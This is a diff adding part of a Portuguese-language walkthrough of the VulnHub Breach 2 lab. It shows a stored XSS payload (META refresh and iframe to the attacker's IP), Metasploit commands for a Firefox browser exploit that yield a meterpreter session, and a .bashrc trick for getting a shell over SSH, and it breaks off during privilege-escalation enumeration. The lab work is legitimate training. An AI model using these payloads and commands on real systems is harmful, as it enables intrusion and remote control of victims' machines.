@@ -115,3 +115,110 @@ How to exploit:
 3- Put anything in the other field ( Password & E-mail).
 4- Now anyone go there : http://localhost/blogphp/members.html will redirected to google.com OR exploit your XSS Code.
 ```
+
+### Testando XSS
+
+Então vamos verificar se esse exploit está valendo para essa aplicação
+
+```
+<META http-equiv="refresh" content="0;URL=http://192.168.110.102">
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/teste.png)
+
+Acessamos o member.html e realmente temos o XSS
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/teste1.png)
+
+Verificamos que o navegador que está executando isso lá é um Firefox 5.0, extremamante antigo, temos exploits para RCE nele
+
+### Firefox 15.0
+
+Encontramos esse exploit [ExploitDB](https://www.exploit-db.com/exploits/30474)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/firefox.png)
+
+Criamos um novo usuário com o nome
+
+```
+<iframe src="http://192.168.110.103"></iframe>
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/firefox2.png)
+
+Setamos as opções no msfconsole
+
+```
+msfconsole -q
+use exploit/multi/browser/firefox_proto_crmfrequest
+set lhost 192.168.110.103
+set lport 55135
+set srvhost 192.168.110.103
+set uripath /
+set srvport 80
+run
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/firefox3.png)
+
+Depois de um tempo...
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/firefox4.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/firefox5.png)
+
+Fazemos o upgrade para meterpreter
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/firefox6.png)
+
+### Por que não conecta ssh?
+
+Verificamos no /etc/sshd_config a resposta para isso
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/ssh2.png)
+
+# Peter
+
+Bom, para pegarmos um shell é simples
+
+Devemos adicionar no .bashrc o sh
+
+```bash
+echo "exec sh" > .bashrc
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/ssh3.png)
+
+Agora logamos via ssh e temos um shell
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/ssh4.png)
+
+## Linpeas
+
+Rodamos o linpeas para encontrar alguma coisa interessante para nossa escalação
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/lin.png)
+
+Baixamos para nossa máquina
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/lin1.png)
+
+Executamos ele
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/lin2.png)
+
+Encontramos algumas portas locais abertas que nos chamaram atenção
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/lin3.png)
+
+## Porta 2323
+
+Verificamos o que tem nessa porta 2323
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/coord.png)
+
+Pareceu uma coordenada
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/coorf1.png)
+
+Realmente, é da cidade de houston
